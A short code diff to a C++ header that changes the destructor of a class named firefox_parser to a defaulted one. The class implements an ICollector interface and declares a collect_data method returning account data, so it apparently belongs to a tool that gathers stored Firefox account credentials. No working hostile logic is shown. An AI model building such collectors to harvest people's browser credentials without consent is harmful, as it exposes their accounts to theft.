@@ -8,7 +8,7 @@ class firefox_parser : public ICollector
 {
 public:
 	firefox_parser();
-	~firefox_parser() override;
+	~firefox_parser() override = default;
 public:
 
 	List<AccountData> collect_data() override;
